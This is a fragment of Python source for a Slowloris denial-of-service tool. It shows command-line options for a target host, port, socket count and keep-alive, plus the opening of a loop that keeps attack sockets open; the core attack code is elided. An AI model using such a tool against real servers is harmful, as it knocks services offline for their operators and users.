...
parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth DOS"
)
parser.add_argument("host", nargs="?", help="Host to attack")
parser.add_argument(
    "-p", "--port", default=80, help="Port to attack (default 80)", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
...
parser.add_argument("-nk", "--nokeepalive", default="false", help="dont use keep-alive", type=bool)
parser.add_argument(
...
def main():
    ...
    while True:
        try:
            logging.info(
                "Sending maintaning sockets. Socket count: %s", len(list_of_sockets)
            )
